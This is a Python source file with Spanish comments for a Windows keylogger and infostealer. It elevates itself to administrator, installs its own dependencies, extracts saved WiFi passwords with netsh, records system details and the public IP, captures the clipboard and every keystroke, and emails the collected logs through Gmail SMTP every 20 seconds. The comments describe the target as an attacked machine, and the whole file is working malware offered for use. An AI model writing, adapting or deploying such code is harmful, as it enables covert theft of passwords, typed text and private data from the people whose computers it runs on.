from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib

import socket
import platform
import win32clipboard
from pynput.keyboard import Key, Listener
from requests import get
import os
import time
import ctypes
import sys
from threading import Thread
import subprocess
import pkg_resources

# Rutas de los archivos de forma relativa
current_directory = os.path.dirname(__file__)
keys_information = os.path.join(current_directory, "key_log.txt")
system_information = os.path.join(current_directory, "systeminfo.txt")
clipboard_information = os.path.join(current_directory, "clipboard.txt")

#credenciales del mail
email_address = 'mail'
password = 'passwd'
toaddr = "mail"

#Funcion para ejecutar el script como administrador
def run_as_admin():
    if ctypes.windll.shell32.IsUserAnAdmin() == 0:
        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)

run_as_admin()

subprocess.run(["runas", "/user:Administrator", "python", "keylogger.py"])

#Funcion que comprueba si una dependencia esta instalada
def is_dependency_installed(dependency_name):
    try:
        pkg_resources.get_distribution(dependency_name)
        return True
    except pkg_resources.DistributionNotFound:
        return False
#lista de dependencias
dependencias = ['pywin32', 'pynput', 'requests']

for dependencia in dependencias:
    if is_dependency_installed(dependencia):
        print(f'La dependencia {dependencia} está instalada.')
#Si la dependencia no esta instalada trata de instalarla
    else:
        print(f'La dependencia {dependencia} no está instalada. Intentando instalar...')
        try:
            subprocess.check_call(['pip', 'install', dependencia])
            print(f'La dependencia {dependencia} se instaló correctamente.')
        except subprocess.CalledProcessError:
            print(f'Error al instalar la dependencia {dependencia}.')

#Funcion que captura los nombres y las contraseñas de los wifis los quales la maquina atacada tiene guardados.
def get_wifi_info():
    try:
        data = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles']).decode('utf-8').split('\n')
        profiles = [i.split(":")[1][1:-1] for i in data if "All User Profile" in i]
        wifi_info = []

        for i in profiles:
            results = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', i, 'key=clear']).decode('utf-8').split('\n')
            results = [b.split(":")[1][1:-1] for b in results if "Key Content" in b]
            try:
                wifi_info.append(f"{i}: {results[0]}\n")
            except IndexError:
                wifi_info.append(f"{i}: \n")
        return "\n".join(wifi_info)
    except subprocess.CalledProcessError:
        return "No se pudo obtener información de WiFi"

#Añade la información al archivo systeminfo.txt
def append_wifi_info_to_system_info():
    wifi_info = get_wifi_info()

    # Leer el contenido actual del archivo systeminfo.txt
    with open(system_information, "r") as f:
        existing_content = f.read()

    # Abrir el archivo en modo de escritura y agregar la información al final
    with open(system_information, "w") as f:
        f.write(existing_content)
        f.write("\n\n=== WiFi Information ===\n")
        f.write(wifi_info)
append_wifi_info_to_system_info()

#Funcion que captura información del sistema tal como el Sistema operativo o la IP.
def computer_information():
    with open(system_information, "w") as f:
        hostname = socket.gethostname()
        IPAddr = socket.gethostbyname(hostname)
        try:
            public_ip = get("https://api.ipify.org").text
            f.write("Public IP Address: " + public_ip)
        except Exception:
            f.write("No se pudo conseguir la IP pública")

        f.write('\n' + "Processor: " + (platform.processor()) + '\n')
        f.write("System: " + platform.system() + " " + platform.version() + '\n')
        f.write("Machine: " + platform.machine() + "\n")
        f.write("Hostname: " + hostname + "\n")
        f.write("Private IP Address: " + IPAddr + "\n")

# Función para copiar el portapapeles
def copy_clipboard():
    with open(clipboard_information, "w") as f:
        f.write("Datos del portapapeles:\n")

        def clipboard_listener():
            while True:
                try:
                    win32clipboard.OpenClipboard()
                    pasted_data = win32clipboard.GetClipboardData()
                    win32clipboard.CloseClipboard()
                    with open(clipboard_information, "a") as clipboard_file:
                        clipboard_file.write("\n" + pasted_data + "\n")
                    time.sleep(5)
                except Exception as e:
                    with open(clipboard_information, "a") as clipboard_file:
                        clipboard_file.write("No se puede copiar (seguramente es una foto o algo que no es texto)\n")
                    time.sleep(5)
        clipboard_thread = Thread(target=clipboard_listener)
        clipboard_thread.daemon = True
        clipboard_thread.start()

#keylogger
def on_press(key):
    if hasattr(key, 'char'):
        with open(keys_information, "a") as f:
            f.write(key.char)
    elif key == Key.space:
        with open(keys_information, "a") as f:
            f.write(" ")
    elif key == Key.enter:
        with open(keys_information, "a") as f:
            f.write("\n")

def on_release(key):
    if key == Key.esc:
        send_email()

#Funcion que envia el mail
def send_email():
    fromaddr = email_address

    msg = MIMEMultipart()

    msg['From'] = fromaddr
    msg['To'] = toaddr
    msg['Subject'] = "Log File"

    body = "Body_of_the_mail"

    msg.attach(MIMEText(body, 'plain'))

    files = [keys_information, system_information, clipboard_information]

    for file in files:
        filename = os.path.basename(file)
        attachment = open(file, 'rb')
        part = MIMEBase('application', 'octet-stream')
        part.set_payload((attachment).read())
        encoders.encode_base64(part)
        part.add_header('Content-Disposition', "attachment; filename= %s" % filename)
        msg.attach(part)

    s = smtplib.SMTP('smtp.gmail.com', 587)
    s.starttls()
    s.login(fromaddr, password)
    text = msg.as_string()
    s.sendmail(fromaddr, toaddr, text)
    s.quit()

# Función para enviar correos automáticamente cada 20 segundos
def send_emails_periodically():
    while True:
        time.sleep(20)
        send_email()

# Iniciar la captura de todas las funciones con Listener
with Listener(on_press=on_press, on_release=on_release) as listener:
    computer_information()
    copy_clipboard()
    email_thread = Thread(target=send_emails_periodically)
    email_thread.daemon = True
    email_thread.start()
    listener.join()
